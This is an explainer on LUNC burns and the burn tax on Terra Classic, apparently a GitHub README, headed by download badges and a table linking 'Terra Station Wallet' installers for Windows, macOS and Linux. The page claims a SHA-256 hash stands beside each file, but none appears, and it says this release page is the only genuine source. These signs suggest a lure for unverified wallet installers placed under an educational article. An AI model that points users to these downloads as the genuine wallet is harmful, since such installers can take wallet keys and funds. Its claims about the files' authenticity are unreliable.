![Terra Station Wallet](assets/banner-article.png)

# LUNC Burns Explained

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Burning LUNC means sending it to an address nobody can spend from, which reduces the supply that exists on chain. On Terra Classic, supply reduction has been handled through chain-level mechanisms that governance sets and revises, and the wallet operates none of them. The exact rule - what is eligible, at what rate, where the proceeds go - is a chain parameter, so it has to be read from current network settings rather than from any article.

## What a burn actually is

A burn is not a payment to anyone. The tokens are transferred to an address whose key is not known to exist, so they remain visible on chain and can never move again. The supply figure the chain reports excludes them from circulation.

| Term | What it means |
|---|---|
| Burn tax | A chain-level mechanism, set by governance, that removes LUNC from circulation |
| Burn address | A destination no one controls; tokens sent there are gone from circulation |
| Community pool | Funds held for proposals, which can include burn-related spending |
| Supply | Total LUNC in existence; burns reduce it |

The distinction between "burned" and "sent to the community pool" matters, because only the first removes supply.

## Where the wallet fits

Terra Station Wallet sends, stakes and votes; it does not burn on its own initiative, and there is no burn button that quietly takes a percentage of your balance. What you may see is a chain-level supply mechanism reflected in a transfer, reported as part of the transaction rather than as a separate charge from the wallet.

If a site offers to "burn your LUNC for you", that is not a wallet function, and it needs your signature like any other transaction - which means it can send your balance anywhere it likes.

## Why the parameter changes

The burn tax is governance territory: the community votes on rates and on how the proceeds are split. A rate that applied last year may not apply now, which is why any fixed percentage quoted on a blog is likely to be out of date (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-governance-voting.md).

The practical implication is simple: the rate that applies to your transaction is the one the chain enforces at the moment you sign, and the app's confirmation screen reflects it.

## What burns do and do not do

**They do.** Reduce the supply that exists, permanently, in a way anyone can verify on an explorer.

**They do not.** Promise anything about what a smaller supply means for value. Supply is one side of a market; demand is the other, and no page here forecasts either. Burn content online is saturated with implied predictions, and none of them are statements this wallet makes.

They also do not change your balance except through the tax on eligible transfers, and they do not make a wallet safer, faster or more private.

## Verifying a claim about burns

Anyone can check the numbers, and it takes a minute:

1. Look up the burn address on a Terra Classic explorer (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-explorer.md).
2. Read its balance and transaction history - that is what has actually been burned by that route.
3. Compare with any figure quoted by a site or a post.
4. Check the current tax rate through a governance or parameter view rather than a blog.

A burn figure that cannot be found on chain is a claim, not a fact. That is not cynicism; it is the same standard applied to your own transaction history.

## Where the tax appears on a transaction

Where the chain applies a supply mechanism to a transfer, it happens inside the transaction rather than beside it. In practice:

- The amount the recipient receives can differ from the amount you sent, with the difference removed by the mechanism rather than kept by anyone.
- The confirmation screen shows the transaction you are about to sign, so the effect is visible before you sign rather than discovered afterwards.
- The explorer shows the actual movement - sent, received, burned - which is the record to trust when a recipient reports a smaller arrival than expected.

That last point matters for exchanges and for anyone receiving a large transfer: a deposit that arrives short by the tax rate is behaving normally, not short-changing the sender. *LUNC Deposit From an Exchange Never Arrived* covers the case where the deposit does not arrive at all, and *Terra Station Wallet Fees and Gas Explained* covers the separate fee that every transaction pays.

The tax and the fee are often conflated in explanations. They are different mechanisms: one pays for execution, the other removes supply.

## Sending your own LUNC to a burn address

It is technically possible to send LUNC to the burn address yourself, and it is irreversible. Nobody can retrieve it, no support process can reverse it, and the wallet will not warn you beyond the ordinary confirmation.

If you intend to do it, treat it exactly like a send to a stranger: confirm the address character by character, send a small amount first, and accept that the amount is gone. Doing it because a post told you to is the version people regret.

## Questions people ask

### Does the wallet burn my LUNC automatically?

No. The wallet applies what the network requires on a transaction, and reports it. There is no separate burn action that takes a cut of your balance.

### Is the burn tax the same as a fee?

No. A fee pays for a transaction's execution; a burn mechanism removes supply. Where both apply they can appear on the same transaction, which is why the two get conflated.

### Can burned LUNC come back?

No. The burn address has no known key, so tokens sent there cannot move. A future governance change could alter the rate, not recover what is already burned.

### Does burning raise the price?

Nothing here says that, and no honest page can. Burning reduces supply; what that does to a market depends on demand, which is not something the wallet or this pack forecasts.

One practical consequence for anyone receiving a large transfer: ask the sender whether the tax applied, rather than assuming a shortfall is a mistake. The explorer's transaction page shows the split, which turns a disagreement into a lookup. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-what-is-it.md sets out what the wallet does and does not do with supply.
